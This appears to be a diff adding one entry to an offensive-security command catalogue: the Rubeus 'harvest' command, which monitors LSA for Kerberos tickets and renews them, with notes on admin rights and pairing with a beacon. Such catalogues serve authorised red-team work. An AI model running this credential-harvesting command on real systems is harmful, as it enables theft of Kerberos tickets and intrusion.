@@ -1,0 +1,13 @@
+{
+  "id": "rubeus-harvest",
+  "name": "Rubeus harvest",
+  "command": "Rubeus.exe harvest /interval:30",
+  "description": "Continuously monitor LSA for new TGTs and auto-renew them before expiry. Long-running collection — pair with a beacon's screen output. Requires elevation for cross-session capture.",
+  "platform": "windows",
+  "requires": ["local-admin"],
+  "protocols": ["kerberos"],
+  "tags": ["rubeus", "harvest", "ticket-collection"],
+  "examples": [
+    "Rubeus.exe harvest /interval:30"
+  ]
+}
